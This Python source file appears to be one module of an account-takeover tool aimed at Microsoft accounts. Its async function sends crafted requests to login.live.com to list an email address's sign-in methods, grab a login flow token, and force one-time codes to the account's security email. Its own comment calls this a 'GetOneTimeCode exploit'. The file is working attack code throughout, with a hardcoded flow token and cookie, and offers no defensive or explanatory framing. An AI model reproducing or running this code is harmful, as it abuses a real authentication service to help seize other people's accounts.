from securing.utils.cookies.get_livedata import livedata
import httpx

async def send_auth(session: httpx.AsyncClient, email: str) -> dict | None:

    # GetCredential no longer forces OTPs
    # Uses a GetOneTimeCode exploit to force it
    send_auth = await session.post(
        url = "https://login.live.com/GetCredentialType.srf",
        headers = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json; charset=utf-8",
            "Cookie": "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
            "Referer": "https://login.live.com/",
            "hpgact": "0",
            "hpgid": "33"
        },
        json = {
            "checkPhones": True,
            "country": "",
            "federationFlags": 3,
            "flowToken": "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
            "forceotclogin": False,
            "isCookieBannerShown": True,
            "isExternalFederationDisallowed": True,
            "isFederationDisabled": True,
            "isFidoSupported": False,
            "isOtherIdpSupported": False,
            "isReactLoginRequest": True,
            "isRemoteConnectSupported": False,
            "isRemoteNGCSupported": True,
            "isSignup": False,
            "otclogindisallowed": False,
            "username": email
        }
    )
    
    print(f"SendAuth Response: {send_auth.text}")
    email_info = send_auth.json()

    # There are secondary methods
    if "Credentials" in email_info:
        
        # Authenticator Request
        if "RemoteNgcParams" in email_info["Credentials"]:
            return {
                "type": "authenticator",
                "response": email_info
            }

        # Email OTP Request
        if "OtcLoginEligibleProofs" in email_info["Credentials"]:


            altemaile = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["data"]
                        
            # Get the login PPFT
            live = await livedata(session)
            flowtoken = live["ppft"]

            # Two tipes of OTPs
            # eOTT_OtcLogin -> Account has a security email
            # eOTT_NoPasswordAccountLoginCode -> Primary receives OTPs
            # Right now only handles 1 security mail
            payload = {
                "login": email,
                "flowtoken": flowtoken,
                "purpose": "eOTT_OtcLogin",
                "channel": "Email",
                "ChallengeViewSupported": 1,
                "AltEmailE": altemaile,
                "lcid": 1033
            }


            security_mail = email_info["Credentials"]["OtcLoginEligibleProofs"][0]["display"]
            if security_mail == email:
                print(f"[~] - Switched OTP Type")
                payload["purpose"] = "eOTT_NoPasswordAccountLoginCode"

            await session.post(
                url = "https://login.live.com/GetOneTimeCode.srf?id=38936",
                headers = {
                    "Accept": "application/json",
                    "Content-type": "application/x-www-form-urlencoded"
                },
                data = payload
            )

            return {
                "type": "email",
                "response": email_info,
                "ppft": flowtoken
            }
    
    return email_info
    


